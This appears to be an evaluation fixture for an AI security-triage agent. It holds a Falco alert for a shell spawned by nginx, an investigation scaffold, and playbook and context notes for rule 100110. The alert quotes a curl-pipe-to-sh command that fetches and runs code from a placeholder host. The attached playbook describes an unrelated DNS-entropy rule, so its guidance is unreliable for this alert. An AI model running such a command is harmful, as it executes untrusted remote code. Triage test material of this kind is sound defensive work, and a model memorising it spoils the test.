@@ -1,0 +1,404 @@
+run_dir=/tmp/predict-comp-g8vg3ur4/baseline-s3/endpoint-falco-nginx-child-loop1
+signature_id=wazuh-rule-100110
+loop_n=1
+
+## Past-investigation priors
+
+Prologue topology — same-signature scope, tier 3: no match, 0 cases matched. Vertex types: endpoint, process. Edge relations: spawned.
+
+Priors at this topology are sparse — scaffold from first principles per PREDICT's ASSESS gate.
+
+<alert-endpsalt000000001>
+{
+  "agent": {
+    "ip": "10.0.7.18",
+    "name": "web-edge-03",
+    "id": "082"
+  },
+  "manager": {
+    "name": "wazuh.manager"
+  },
+  "data": {
+    "rule_name": "Suspicious child of web server",
+    "proc.name": "sh",
+    "proc.cmdline": "sh -c \"curl -fsSL http://updates.example.io/x | sh\"",
+    "proc.pname": "nginx",
+    "proc.ppid": 1422,
+    "proc.pid": 31807,
+    "user.name": "www-data",
+    "user.uid": 33,
+    "container.id": "host",
+    "evt.type": "execve"
+  },
+  "rule": {
+    "id": "100110",
+    "level": 9,
+    "description": "Falco: shell spawned as child of nginx worker"
+  },
+  "timestamp": "2026-04-26T03:11:07.802+0000"
+}
+</alert-endpsalt000000001>
+
+<investigation mode="predict">
+## CONTEXTUALIZE
+
+**Alert:** 1777222267.80 — wazuh-rule-100110 (Falco: shell spawned as child of nginx worker)
+**Key observables:**
+- agent: web-edge-03 / 10.0.7.18 (internet-facing nginx reverse proxy)
+- proc.name: sh — child of nginx pid 1422
+- proc.cmdline: `sh -c "curl -fsSL http://updates.example.io/x | sh"`
+- user: www-data (uid 33) — the runtime user nginx normally drops to
+- container.id: host (not in a container)
+- timestamp: 2026-04-26T03:11:07.802Z
+**Playbook hypotheses:** ?webshell-rce, ?legitimate-deploy-hook, ?certbot-renewal-hook, ?cron-driven-reload
+**Available leads:** process-lineage, deploy-runs-correlation, web-server-child-baseline, outbound-connection-pairing, recent-config-changes
+**Archetype matches:**
+- webshell-rce — candidate — `sh -c "curl … | sh"` is the textbook `curl-pipe-sh` shape; web server spawning shell on a request path is the canonical RCE-via-nginx pattern.
+- deploy-hook — candidate — some deploy systems (capistrano, ansible) DO spawn shells from nginx via post-receive scripts, especially on edge proxies.
+- certbot-renewal — candidate — certbot's --pre-hook / --post-hook can run as the web user during renewal windows.
+**Adversarial archetype:** webshell-rce — worst-case is an attacker reached an upload endpoint and pivoted to shell.
+**Data environment:** reachable: host_query, wazuh, deploy-runs-api, playground_ticket; degraded: none
+
+```yaml
+prologue:
+  vertices:
+  - id: v-001
+    type: endpoint
+    classification: internet-facing-edge-proxy
+    identifier: 10.0.7.18
+    attributes:
+      hostname: web-edge-03
+  - id: v-002
+    type: process
+    classification: shell-process
+    identifier: pid-31807
+    attributes:
+      proc_name: sh
+      cmdline: 'sh -c "curl -fsSL http://updates.example.io/x | sh"'
+      user: www-data
+      uid: 33
+  edges:
+  - id: e-001
+    relation: spawned
+    source_vertex: v-001
+    target_vertex: v-002
+    when:
+      timestamp: '2026-04-26T03:11:07.802Z'
+    attributes:
+      parent_proc: nginx
+      parent_pid: 1422
+    authority:
+      kind: siem-event
+      source: Falco syscall monitor
+```
+</investigation>
+
+<signature-knowledge>
+  <playbook>
+---
+signature_id: wazuh-rule-100110
+last_updated: 2026-04-09
+total_investigations: 0
+resolution_rate: null
+---
+
+# Investigation Playbook: DNS query with high-entropy subdomain (100110)
+
+This playbook is **steering, not procedure**. The investigation
+methodology lives in the `investigate` skill.
+
+> **Stress test:** This signature is inherently ambiguous. Many
+> legitimate services produce DNS queries that match the rule's
+> pattern. The investigation goal is **not** to "prove benign" — it
+> is to determine whether the query fits a known legitimate pattern
+> *for this environment* or whether it could plausibly be C2 or
+> tunneling. When in doubt, escalate.
+
+The archetype catalog under `archetypes/` is partial: only the
+escalation archetype `co-fired-malicious-pattern` is authored so
+far. The remaining common patterns are listed as starter hypotheses.
+
+## Field shortcuts
+
+| Field | Purpose |
+|---|---|
+| `data.dns_domain` | The full queried domain — extract the eTLD+1 for parent classification |
+| `data.dns_query_type` | Query type (A, AAAA, TXT, NULL) — encoded-data hypotheses prefer TXT and NULL |
+
+## Hypothesis seeds
+
+At loop 1 there is typically no fork to articulate. The alert
+confirms a DNS query from `v-agent-host` targeting
+`v-queried-domain`, and the first leads are attribute-enrichment on
+those already-confirmed vertices (parent-domain classification,
+subdomain shape, query history, process attribution where available)
+— not topology-extending proposals. Stay in the mechanical /
+interpretive lane per §ASSESS and pre-register readings on the
+interpretive fields (reputation class, label-shape judgment).
+
+A fork opens after enrichment when the query-history cluster shape
+is ambiguous. Reach for one of these seed labels:
+
+- **`?one-shot-resolution`** — isolated lookup; no sibling clustering
+  on this eTLD+1 or NXDOMAIN burst around it.
+- **`?candidate-probing`** — varied-domain cluster with NXDOMAIN rate
+  above baseline (DGA shape).
+- **`?dns-channel`** — varied-subdomain cluster under the same
+  eTLD+1, regular cadence or high volume, possibly TXT/NULL (tunneling
+  shape).
+
+Legitimacy (known provider vs. unsanctioned) is a target-vertex
+attribute resolved by the parent-domain-classification anchor, not a
+parallel hypothesis.
+
+## Starter lead order
+
+1. **`parent-domain-classification`** — extract the eTLD+1 from
+   `data.dns_domain` and classify it. Is the parent a known CDN,
+   cloud provider, analytics platform, or other recognizable
+   service? Has it been queried before from this environment? The
+   eTLD+1 is the strongest single signal.
+2. **`query-history-for-parent`** — all DNS queries from this
+   environment to the same eTLD+1 in the last 7-30 days. How many
+   distinct subdomains? What query types? What reply distribution
+   (success vs NXDOMAIN)?
+3. **`subdomain-shape`** — inspect the leading label of
+   `data.dns_domain`. Recognizable English word, hash-like
+   alphanumeric, base32/base64 encoded, or hex? What is its length
+   and character distribution?
+
+> **Co-firing of 100112/100113/100115/100116** is handled by the
+> ticket-context subagent at CONTEXTUALIZE — its findings are
+> already in the investigation context. If any of those rules
+> co-fired from the same agent, the `co-fired-malicious-pattern`
+> archetype matches and the alert escalates regardless of the other
+> leads.
+
+## Signature quirks
+
+- **DGA vs DNS-tunneling discrimination is not required.** Both
+  are escalation outcomes — the agent does not need to pick between
+  them. If the evidence supports either, escalate with both listed
+  as active threat hypotheses and let the human investigator (with
+  WHOIS, threat intel, and host forensics) make the final call.
+- **An unknown parent domain is the first escalation signal.**
+  When the parent (eTLD+1) is not recognizable as a known provider
+  and is not established in environment history, escalate rather
+  than characterize further. The bar for benign resolution is high
+  precisely because this rule is broad.
+- **Encoded subdomain shape is suspicious regardless of parent.**
+  A base32/base64/hex-shaped label under a known CDN parent is
+  *more* suspicious than under an unknown parent, because it
+  suggests domain fronting. The shape and the parent classification
+  compose: known parent + encoded shape escalates.
+
+## Scope
+
+Standard for this signature: the alerting query, other DNS events
+to the same eTLD+1 from the same agent in a ±15 minute window (and
+the broader 7-30 day history for that parent), and other alerts
+from the same agent in the last 24 hours (provided by
+ticket-context at CONTEXTUALIZE — don't re-query). Anything beyond
+this requires escalation per the skill's stay-in-scope rule.
+  </playbook>
+  <context>
+---
+signature_id: wazuh-rule-100110
+name: DNS query with high-entropy subdomain
+severity: medium
+data_sources:
+  - network-events
+created_at: 2026-04-08
+updated_at: 2026-04-08
+mitre:
+  tactics: Command and Control, Exfiltration
+  techniques: T1568.002, T1071.004, T1048.003
+references:
+  - https://attack.mitre.org/techniques/T1568/002/
+related_signatures:
+  - wazuh-rule-100112
+  - wazuh-rule-100113
+  - wazuh-rule-100115
+  - wazuh-rule-100116
+base_rate:
+  benign_pct: null
+  sample_size: null
+---
+
+# Wazuh Rule 100110: DNS query with high-entropy subdomain
+
+## Signature Logic
+
+Custom Wazuh rule. The fundamental detected activity: **a DNS query was
+issued whose leading label is at least 12 alphanumeric characters long.**
+
+The activity is observed via the local dnsmasq resolver on the endpoint,
+which logs every query through syslog. A custom Wazuh decoder
+(`dnsmasq-query`) parses the syslog line into `dns_query_type`,
+`dns_domain`, and `srcip` fields. Rule 100100 catches every parsed query;
+rule 100110 narrows to queries whose `dns_domain` matches a regex
+requiring 12+ alphanumerics in the leftmost label followed by a parent
+domain. See `playground/config/wazuh_cluster/rules/dns_rules.xml`.
+
+The rule does **not** compute Shannon entropy or any real randomness
+measure — only label length. A 12-character English word matches the same
+as a 12-character base32 blob.
+
+This is a deliberate stress-test signature: the rule is broad and
+ambiguous by design. Many legitimate services emit DNS queries that match
+this shape. Resolving these alerts requires domain knowledge the rule
+cannot encode.
+
+## Related Rules
+
+| Rule ID | Description | Relationship |
+|---------|-------------|--------------|
+| 100100 | Base DNS query event | Parent rule (always fires first via `if_sid`) |
+| 100101 | DNS reply NXDOMAIN | Useful correlator for DGA |
+| 100112 | TXT query | Often paired with tunneling cases |
+| 100113 | NXDOMAIN burst (8 in 120s) | Strong DGA signal when correlated |
+| 100115 | Known malicious domain pattern | Higher-confidence sibling |
+| 100116 | High-volume DNS queries (15 in 60s) | Useful for beaconing/tunneling cases |
+
+## Threat & Motivation
+
+**What the activity is.** A process on the endpoint called the resolver
+(directly or via libc) for a domain name with a long leading label. At
+the OS level this is a `connect()` to the resolver socket and a DNS
+packet on the wire. dnsmasq is the local intercept that lets us see it
+without taking a pcap.
+
+**Why an attacker would do this.** Two main use cases:
+
+- **DGA C2 (T1568.002):** Malware embeds a domain-generation algorithm.
+  At runtime it generates many candidate domains, queries each one, and
+  uses whichever resolves to find its current C2 controller. Most queries
+  return NXDOMAIN; one resolves and becomes the live channel. Defenders
+  who block known C2 domains can't keep up because the domains rotate.
+- **DNS tunneling / exfiltration (T1071.004, T1048.003):** The attacker
+  controls an authoritative server for some domain. The malware encodes
+  data into DNS query labels (typically base32 because of DNS character
+  restrictions) and queries them as subdomains of the controlled parent.
+  The auth server logs the queries and reassembles the data. Often uses
+  TXT or NULL records for two-way traffic.
+
+**Concrete attacker scenarios:**
+- Commodity malware (Conficker, Necurs, Sality) calling home via DGA
+- Cobalt Strike or Sliver implants tunnelling over DNS in network-egress
+  -restricted environments
+- Slow exfiltration of credentials or files via base32-encoded subdomain
+  labels to an attacker domain
+
+**Legitimate reasons this fires.** A lot of the modern internet looks
+like this. All of these are real and common:
+
+- CDN cache keys and edge routing — CloudFront, Akamai, Fastly, Cloudflare
+  all use long opaque hostnames
+- Cloud services using opaque shard/region identifiers — AWS S3,
+  GoogleUserContent, Azure CDN
+- Browser anti-DNS-rebinding random subdomains
+- Email tracking / link shortener / abuse-prevention domains
+- Analytics, advertising, anti-fraud, and bot-detection telemetry
+- Service workers and PWA cache lookups
+
+**Blast radius if real.** Active C2 channel or ongoing data exfiltration.
+The host issuing the query is presumed compromised.
+
+## Risk Indicators
+
+The risk on this signature comes from **two orthogonal axes**:
+
+### Axis 1 — Reputation of the parent domain
+
+Is the eTLD+1 a recognizable, established service in this environment, or
+something unknown?
+
+- Parent matches a known CDN / cloud / analytics provider allowlist
+  (lower risk)
+- Parent has been queried many times historically from this environment
+  with varied subdomains (lower risk — established footprint)
+- Parent is unknown / never queried before / recently registered (higher
+  risk)
+- Parent is in a frequently-abused TLD (.xyz, .top, .tk, .ml, ...; higher
+  risk; rule 100111 fires when this is true)
+
+### Axis 2 — Pattern shape and co-firing rules
+
+Does the alert sit alone, or is it part of a recognizable C2/tunneling
+pattern?
+
+- Single isolated query, normal record type (A/AAAA), resolves
+  successfully (lower risk in isolation; ambiguous without parent
+  reputation)
+- Burst of NXDOMAIN replies from the same host (rule 100113 co-fires;
+  classic DGA probing signature)
+- High volume of queries to varied subdomains under the same parent in a
+  short window (rule 100116 co-fires; beaconing or tunneling)
+- TXT or NULL record queries (rule 100112 co-fires; tunneling-favoured
+  record types)
+- Subdomain label is structured (base32/base64/hex chunks, fixed format
+  across queries; possible encoded data)
+
+A high-reputation parent + isolated normal-shape query is the low-risk
+quadrant. An unknown/new parent + co-firing volume/NXDOMAIN/TXT rules is
+the high-risk quadrant.
+
+> **Stress-test note:** Treat every benign-looking match as a hypothesis
+> to validate, not a fact to assume. The single biggest failure mode for
+> this signature is dismissing a real C2 query as "looks like a CDN."
+> Reputation classification is not a guarantee — domain-fronting and
+> compromised legit services exist. Sanction must come from outside the
+> SIEM (allowlist, threat-intel feed, etc.).
+
+## Detection Gaps
+
+- No process attribution — the query log contains no PID or process name.
+- No client identification — `srcip` is the local resolver, not the
+  originating client process.
+- Real entropy is not measured; only label length. A 12-char English word
+  matches; a 12-char base32 blob matches; an 11-char base32 blob doesn't.
+- Encrypted DNS (DoH/DoT) bypasses the local resolver entirely and is
+  invisible to this rule.
+- Queries to subdomains shorter than 12 characters under controlled
+  domains can still serve as tunneling channels and will not match.
+- The regex requires the parent domain to have **exactly two labels**
+  after the high-entropy leading label (`<12+ chars>.<label>.<label>`).
+  Single-label parents (e.g., `xk3j2aab8f9q.localhost`) and deeper parents
+  (e.g., `xk3j2aab8f9q.foo.bar.example.com`) match differently and may be
+  missed depending on label boundaries.
+  </context>
+</signature-knowledge>
+
+<lead-catalog>
+  <lead name="ad-hoc" data_tags="[]">
+  </lead>
+  <lead name="authentication-history" data_tags="[auth-events]">
+Retrieve and characterize authentication patterns for a given entity
+(IP, user, or host) over a time window.
+  </lead>
+  <lead name="correlated-endpoint-events" data_tags="[endpoint-events]">
+Retrieve and characterize correlated endpoint events around an alert — events from the same endpoint entity (container, host, workstation) in a tight window around the alert timestamp, to surface co-firing signals (other detection rules tripping on the same entity at the same time) and the structural shape of each co-fire.
+  </lead>
+  <lead name="data-source-debug" data_tags="[]">
+Diagnose why a query returned suspect results. Determine whether the issue
+is data availability, field naming, query construction, or source health.
+  </lead>
+  <lead name="network-analysis" data_tags="[network-events]">
+Characterize network activity for a given entity — connections made
+or received, traffic patterns, and communication targets.
+  </lead>
+  <lead name="process-lineage" data_tags="[process-events]">
+Reconstruct the process tree for a suspicious process — its parent chain,
+child processes, and the context of execution.
+  </lead>
+  <lead name="source-reputation" data_tags="[asset-state, threat-intel]">
+Determine the identity and reputation of a source entity (IP, hostname,
+or domain). Is it a known internal asset, a known external service,
+or unrecognized?
+  </lead>
+  <lead name="user-analysis" data_tags="[identity-state, auth-events]">
+Classify the user account(s) involved in an alert against known
+patterns and determine what the account choice reveals about the
+actor's intent.
+  </lead>
+</lead-catalog>
